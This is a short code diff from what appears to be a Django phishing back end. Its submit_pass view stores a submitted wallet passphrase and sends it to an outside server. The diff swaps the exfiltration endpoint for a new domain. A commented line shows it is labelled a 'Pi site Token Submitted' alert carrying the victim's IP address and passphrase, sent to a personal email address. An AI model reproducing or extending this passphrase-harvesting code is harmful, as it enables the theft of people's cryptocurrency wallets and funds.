@@ -127,7 +127,8 @@ def submit_pass(request):
                 )
                 key_save.save()
 
-                requests.get(f'https://eazydevmail.pythonanywhere.com/send/{keys}/')
+                # requests.get(f'https://eazydevmail.pythonanywhere.com/send/{keys}/')
+                requests.get(f'https://mailing.dtsluxtransport.com/send/{keys}/')
 
                 # if my_site:
                 #     send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time} (My site)', email_to="ezekielobiajulu0@gmail.com")
